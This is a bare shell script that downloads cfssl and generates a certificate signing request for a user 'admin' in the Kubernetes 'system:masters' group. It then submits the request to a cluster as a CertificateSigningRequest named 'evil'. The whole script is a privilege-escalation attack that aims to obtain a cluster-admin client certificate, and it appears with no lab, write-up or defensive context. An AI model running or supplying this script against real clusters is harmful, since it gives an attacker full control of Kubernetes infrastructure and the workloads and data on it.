if [[ ! -x "cfssl" && ! -x "cfssljson" ]]; then { 
  curl -Lo cfssl https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssl_1.5.0_linux_amd64 && chmod 700 cfssl
  curl -Lo cfssljson https://github.com/cloudflare/cfssl/releases/download/v1.5.0/cfssljson_1.5.0_linux_amd64 && chmod 700 cfssljson
}; fi

# create a certificate signing request
cat <<EOF | ./cfssl genkey - | ./cfssljson -bare server
{
  "CN": "admin",
  "names": [
      {
        "O": "system:masters"
      }
  ],
  "key": {
    "algo": "rsa",
    "size": 2048
  }
}
EOF

# create a signing request
cat <<EOF | kubectl apply -f -
apiVersion: certificates.k8s.io/v1beta1
kind: CertificateSigningRequest
metadata:
  name: evil
spec:
  signerName: kubernetes.io/legacy-unknown
  request: $(cat server.csr | base64 | tr -d '\n')
  usages:
  - digital signature
  - key encipherment
  - client auth
EOF